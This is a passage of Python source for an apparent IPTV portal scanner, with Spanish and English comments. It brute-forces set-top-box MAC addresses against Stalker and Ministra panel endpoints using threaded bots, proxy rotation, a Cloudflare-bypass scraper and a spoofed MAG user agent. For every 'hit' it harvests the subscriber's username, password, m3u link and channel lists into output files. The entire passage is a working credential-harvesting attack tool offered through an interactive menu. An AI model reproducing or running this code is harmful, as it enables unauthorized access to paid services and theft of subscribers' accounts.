                        playerapi = HitData()
                        if not m3ulink == "":
                            playerlink = str("http://" + self.panel.replace('http://', '').replace('/c/',
                                                                                              '') + "/player_api.php?username=" + user + "&password=" + pas)
                            self.m3uapi(playerlink, macs, token, playerapi, miSession)
                            if playerapi.mensaje == "":
                                playerlink = str("http://" + real.replace('http://', '').replace('/c/',
                                                                                                 '') + "/player_api.php?username=" + user + "&password=" + pas)
                                self.m3uapi(playerlink, macs, token, playerapi, miSession)
                        #------------------------checkM3u
                        try:
                            if m3uCheck(cid,user,pas,self.panel,miSession).find("KO")>=0:
                                playerapi.m3uValid="⛔️ 𝗢𝗙𝗙𝗟𝗜𝗡𝗘"
                            else:
                                playerapi.m3uValid = "  👍  💪 👍 ONLINE"

                        except Exception as errp:
                            print("!!!!!!!!!!!!!!!!!M3uCheck:",errp)
                        # ------------------------checkM3u

                        vpn = ""
                        if not ip == "":
                            vpn = vpnip(ip, miSession)
                        else:
                            vpn = "No_CLIENT_IP"
                        livelist = ""
                        listlink = miUrlDeclase.liveurl
                        livel = ' «⭐️» '
                        livelist = self.list(listlink, macs, token, livel, miSession)
                        listlink = miUrlDeclase.vodurl
                        livel = ' «💥️» '
                        vodlist = self.list(listlink, macs, token, livel, miSession)
                        listlink = miUrlDeclase.seriesurl
                        livel = ' «⚡️️» '
                        serieslist = self.list(listlink, macs, token, livel, miSession)
                        # asignamos los datos al objeto
                        try:
                            playerapi.mac = mac
                            playerapi.real = real
                            playerapi.url = real
                            playerapi.password = pas
                            playerapi.user = user
                            playerapi.playerlink = playerapi
                            playerapi.portal = """http://""" + self.panel + """/c/"""
                            playerapi.panel = self.panel
                            playerapi.serieslist = serieslist
                            playerapi.vodlist = vodlist
                            playerapi.livelist = livelist
                            playerapi.nickUser = nickn
                            playerapi.vpn = vpn
                            playerapi.m3uURL = m3ulink
                            playerapi.accountType = accountType
                            if (playerapi.caducidad == ""):
                                playerapi.caducidad = lastDate
                            self.createSerialInfoFromMAC(playerapi)
                            if apiMode:
                                return playerapi
                            else:
                                self.hit(playerapi)
                            playerapi.m3uValid=""#anulo el valor, por si tenemos problemas de multithread
                        except Exception as error:
                            print("Error escribiendo HITs:", error)
                    else:
                        False
                        # print("----------1---------Mac without PHONE:",macs, "--->respuesta:",veri)
                        if apiMode:
                            return ""
            else:
                False
                # no tenia token la invocacion
                # print("-------1-------MAC sin token:",macs)
                if apiMode:
                    return ""
        print("Hilo:", numeroBot, " del Panel:", self.panel, " Finalizado")

    def daemonRunbackup(self):
        while (True):
            miBackupScanData.updateServerInfo(self.panel, self.jumpMacs, patronFiltroPais, nickn, preMSGFile, fileName,
                                              botsay)
            time.sleep(30)

    # Inicia totalHilos en paralelo
    def iniciarHilos(self):
        self.TiempoInicio = time.time()  # tiempo en el que empiezo
        daemon = threading.Thread(target=self.daemonRunbackup)
        daemon.setDaemon(True)

        for n in range(self.totalHilos):
            try:
                import cfscrape
                sesq = requests.Session()
                sessionThread = cfscrape.create_scraper(sess=sesq)
            except:
                sessionThread = requests.Session()
            print("Iniciando Hilo", n, " Para el panel:", panel, "++++++++++", version,
                  "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
            t1 = threading.Thread(target=self.doScan, args=(self.datosSalida, n, sessionThread, miScannerProxies,))
            t1.start()

        daemon.start()


# -----------------------------------------------------------------------------------------------------------
# start point menu/config
def menuProxies():
    global menu
    print(menu)
    dir = rootDir + '/proxies/'
    checkDirestories()
    file = len(menu)
    say = 0
    total = 0
    filelist = ""
    listaProxies = os.listdir(dir)
    for files in listaProxies:
        filelist = filelist + "	" + str(total) + "=⫸ " + files + '\n'
        total = total + 1
    print(filelist)
    print("""\33[33m """ + str(total) + """ Proxy Files located """)
    proxyVar = str(input(" \33[31m(Enter no proxies will be used)Proxies File No =\33[0m"))
    try:
        if proxyVar != 0:
            return (dir + listaProxies[int(proxyVar)])
        else:
            return ""
    except Exception as err:  # user selected an error option
        return ""


# # ----------------------------****************proxy type**********************_---------------------------------

def menuProxiesType():
    global menu
    print(menu)
    print("\33[33m Proxies Type:\33[0m")
    print("\33[33m1-Sock5 Type:\33[0m")
    print("\33[33m2-Sock4 Type:\33[0m")
    print("\33[33m3-HTTP Type:\33[0m")
    print("\33[33m4-IpVanish  Type:\33[0m")
    print("\33[33m5-noPROXY  Type:\33[0m")

    SOCKS5 = 1
    SOCKS4 = 2
    HTTP = 3
    IPVANISH = 4
    try:
        opcion = int(input("Choose your option:"))
        if ((opcion >= 1) and (opcion <= 4)):
            return opcion
        else:
            return 0
    except:
        return 0


# # ----------------------------****************proxy option**********************_---------------------------------
if __name__ == '__main__':
    print(menu)
    checkDirestories()
    proxyType = menuProxiesType()
    miScannerProxies: ScannerProxies
    if (proxyType != 0):
        proxySelected = menuProxies()
        print("\33[33mProxy selected---->", proxySelected, "\33[0m")
        if (proxySelected != ""):
            if (proxyType == ScannerProxies.IPVANISH):
                miScannerProxies = ScannerProxies(proxySelected, ScannerProxies.IPVANISH)
            else:
                if (proxyType == ScannerProxies.SOCKS5):
                    miScannerProxies = ScannerProxies(proxySelected, ScannerProxies.SOCKS5)
                else:
                    if (proxyType == ScannerProxies.SOCKS4):
                        miScannerProxies = ScannerProxies(proxySelected, ScannerProxies.SOCKS4)
                    else:
                        if (proxyType == ScannerProxies.HTTP):
                            miScannerProxies = ScannerProxies(proxySelected, ScannerProxies.HTTP)
            miScannerProxies.loadProxiesFromFile()
            print("Lista de proxies:", miScannerProxies)
            toUseProxies = True
    else:
        miScannerProxies = ScannerProxies("", ScannerProxies.HTTP)
        toUseProxies = False

    # ----------------------------*********Menu print*****************************_----------------------------------------------
    if __name__ == '__main__':
        print(menu)
        nick = 'ABRAHAM PERUANO'

        miBackupScanData = BackupScanData()
        existeBackup = miBackupScanData.verifyRestoreFile()  # existe fichero de backup anterior
        respBackup = False  # respuesta para el backup
        panelLista = list
        if existeBackup:
            miBackupScanData.readServerData()
            print("\33[1;96mExiste un fichero de ejecución anterior con los siguientes servidores:\33[0m" + str(
                miBackupScanData.serverRestoreData()))
            respBackup = input("\nDesea recuperar la ejecución anterior?(S/N)")
            if (respBackup.capitalize().find("S")) != -1:
                respBackup = True
            else:
                respBackup = False
                print("\n\33[1;91mBorrando fichero de backup anterior\33[0m")
                remove('restore.ini')
                miBackupScanData.deleteData()
            panelLista = list(map(str, miBackupScanData.serverRestoreData()))

        aplicarFiltro = False
        bekleme = 1
        isimle = ""
        # Tipos de portales a scanear
        intro = """
                \33[1;31m𝟷 \33[0m\33[1;32m=⫸ \33[0m \33[33mᴘᴏʀᴛᴀʟ.ᴘʜᴘ \33[0m  
                \33[1;31m𝟸 \33[0m\33[1;32m=⫸ \33[0m \33[33msᴇʀᴠᴇʀ/ʟᴏᴀᴅ.ᴘʜᴘ \33[0m    
                \33[1;31m𝟹 \33[0m\33[1;32m=⫸ \33[0m \33[33msᴛᴀʟᴋᴇʀ_ᴘᴏʀᴛᴀʟ \33[0m
                \33[1;31m𝟺 \33[0m\33[1;32m=⫸ \33[0m \33[33mʙs.ᴍᴀɢ.ᴘᴏʀᴛᴀʟ.ᴘʜᴘ \33[0m
                \33[1;31m𝟻 \33[0m\33[1;32m=⫸ \33[0m \33[33mᴘᴏʀᴛᴀʟᴄᴄ.ᴘʜᴘ \33[0m
                \33[1;31m𝟼 \33[0m\33[1;32m=⫸ \33[0m \33[33mᴍᴀɢʟᴏᴀᴅ.ᴘʜᴘ \33[0m
                \33[1;31m𝟽 \33[0m\33[1;32m=⫸ \33[0m \33[33mᴍɪɴɪsᴛʀᴀ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ \33[0m
            
            \33[1;44m Panel - Port (varios separador por espacios)=\33[0m\33[31m\33[1;37;41m"""
        if not respBackup:
            panelLista = list(
                map(str, input("Server separated by spaces: ").split()))  # permitimos cargas varias url separadas por espacio
            a = """panel-puerto = """
        else:
            panelLista = list(map(str, miBackupScanData.serverRestoreData()))
        panelMenu = panelLista.__getitem__(0)  # por defecto es el primero por si solo puso 1
        patronFiltroPais = ""
        print('\33[0m')
        speed = ""
        aplicarFiltro = False  # permite buscar una cadena dentro de la lista de paises encontrados, por ejemplo spain
        if not respBackup:
            patronFiltroPais = input("\33[1;42m Filter word to be found  (between space) =\33[0m\33[31m\33[1;37;41m")
            print("\33[1;41m Choosen Words=\33[0m", patronFiltroPais)
            if (len(patronFiltroPais) > 0):
                aplicarFiltro = True
        if not respBackup:
            nickn = input("\33[1;42mExecutor Name(this appears at the output file) =\33[0m\33[31m\33[1;37;41m")
            if nickn == "":
                nickn = "☛ABRAHAM PERUANO-⫸"
        else:
            nickn = miBackupScanData.config['general']['ExecutorName']

        portalConcatString = "portal.php"  # solo activo el tipo para mac
        useragent = "okhttp/4.7.1"

        if panelMenu == "" or panelMenu == "1":
            portalConcatString = "portal.php"
            useragent = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
            print(menu)
            panelMenu = input(a)
        if panelMenu == "2":
            portalConcatString = "server/load.php"
            print(menu)
            panelMenu = input(a)
        if panelMenu == "3":
            portalConcatString = "stalker_portal/server/load.php"
            print(menu)
            panelMenu = input(a)
        if panelMenu == "4":
            portalConcatString = "bs.mag.portal.php"
            print(menu)
            panelMenu = input(a)
        if panelMenu == "5":
            portalConcatString = "portalcc.php"
            print(menu)
            panelMenu = input(a)
        if panelMenu == "6":
            portalConcatString = "magLoad.php"
            print(menu)
            panelMenu = input(a)
        if panelMenu == "7":
            portalConcatString = "ministra/portal.php"
            print(menu)
            panelMenu = input(a)

        realblue = ""
        if panelMenu == "20":
            realblue = "real"
            print(menu)
            panelMenu = input(intro)

        print('\33[0m')
        print(panelMenu)
        print("\33[1;40m" + menu)

        print(menu)
        listaMacs = "000000"
        fileName = ""
        patronesMAC = (
            'D4:CF:F9:',
            '33:44:CF:',
            '10:27:BE:',
            'A0:BB:3E:',
            '55:93:EA:',
            '04:D6:AA:',
            '11:33:01:',
            '00:1C:19:',
            '1A:00:6A:',
            '1A:00:FB:',
            '00:A1:79:',
            '00:1B:79:',
            '00:2A:79:',
            '00:1A:79:',
        )
        if "1" == "1":  # now only use default portal
            if not respBackup:
                say = 0
                dsy = "\n       \33[1;4;94;47m 0=⫸ Aleatorias (OTO MAC)  \33[0m\n"
                dir = rootDir + '/combo/'
                checkDirestories()
                file = len(menu)
                for files in os.listdir(dir):
                    say = say + 1
                    dsy = dsy + "	" + str(say) + "=⫸ " + files + '\n'
                print("""Select the COMBO file to scan""" + dsy + """
            \33[33m """ + str(say) + """ Archivo COMBO encontrado
                """)
                tipoMac = str(input(" \33[31mCombo No =\33[0m"))
                say = 0
            else:
                tipoMac = 1
            if tipoMac == "":
                tipoMac = "0"
            if tipoMac == "0":
                # generacion aleatoria de mac
                print(menu)
                nnesil = str(patronesMAC)
                nnesil = (nnesil.count(',') + 1)
                for xd in range(0, (nnesil)):
                    tire = '  》'
                    if int(xd) < 9:
                        tire = '   》'
                    print(str(xd + 1) + tire + patronesMAC[xd])

                mactur = input("Responde cualquiera =")
                if mactur == "":
                    mactur = 14
                print(mactur)
                mactur = patronesMAC[int(mactur) - 1]
                print(mactur)
                totalMacs = input("""
            
        ¿A qué hora se detiene el escaneo?=⫸""")
                if totalMacs == "":
                    totalMacs = 30000
                totalMacs = int(totalMacs)
                print(totalMacs)
            else:
                if not respBackup:
                    for files in os.listdir(dir):
                        say = say + 1
                        if tipoMac == str(say):
                            fileName = (dir + files)
                            break
                else:
                    fileName = miBackupScanData.config["general"]["combofile"]
                say = 0
                if not fileName == "":
                    print(fileName)
                else:
                    print("¡Incorrect selection of the COMBO file...!")
                    quit()
                c = open(fileName, 'r')
                listaMacs = c.readlines()
                totalMacs = (len(listaMacs))
            print(menu)
            comienzo = ""

            if not comienzo == "":
                comienzo = int(comienzo)
                csay = comienzo
        if not respBackup:
            botsay = input("""
                
            \33[1;96mBOT!\33[0m
                \33[1;33mNumbers of BOTs to run for each portal(BE CAREFUL!!)\33[0m
                            🙄🙄🙄☛☛☛☛☛Bots number =""")

            print(menu)
            if botsay == "":
                botsay = int(4)
            botsay = int(botsay)
        else:
            botsay = (miBackupScanData.config["general"]["bots"])
        Rhit = '\33[33m'
        Ehit = '\033[0m'

        acount_id = ""
        # header for output text files
        preMSGFile = "SPS75"
        if not respBackup:
            preMSGFile = input("❌❌❌❌--->Pre text for output files:(Name that appears in the at the beginning of the file)")
            if (preMSGFile == ""):
                preMSGFile = "SPS75"
        else:
            preMSGFile = miBackupScanData.config["general"]["preMessageOutputfile"]
        if int(time.time()) >= int(1704056400.0):
            quit()
        tokenr = "\33[0m"
        jumpMacs = 0
        try:
            if not respBackup:
                jumpMacs = int(input("🌟🌟do you wish to jump any mac from the mac file?"))
        except:
            jumpMacs = 0
        # -----------------------------------------------end Menu/config------------------------------------------


        for aux in panelLista:
            panel = aux
            # eliminamos los caracteres que no valen de la url
            panel = panel.replace("http://", "")
            panel = panel.replace("/c", "")
            panel = panel.replace("/", "")
            panel = panel.replace('stalker_portal', '/stalker_portal')
            print("Usando panel :", panel)
            # create output portal for each different portal
            misDatosSalida = OutpotHitsFiles(panel, preMSGFile)
            if (botsay == ""):
                botsay = 1
            # create output excel class for each different portal
            miExcelWrite = ExcelOut(misDatosSalida.ficheroExcel)
            # miExcelWrite.createExcel(misDatosSalida.ficheroExcel)
            # a new Scanner is created for each portal
            if respBackup:
                jumpMacs = miBackupScanData.config[panel]["PosicionMacs"]
                patronFiltroPais = miBackupScanData.config[panel]["filtro"]
                if not patronFiltroPais == "":
                    aplicarFiltro = True
            miScanner = PortalScanner(panel, misDatosSalida, int(botsay), miExcelWrite, toUseProxies, miScannerProxies,
                                      jumpMacs)
            miBackupScanData.updateServerInfo(panel, jumpMacs, patronFiltroPais, nickn, preMSGFile, fileName, botsay)
            miScanner.iniciarHilos()
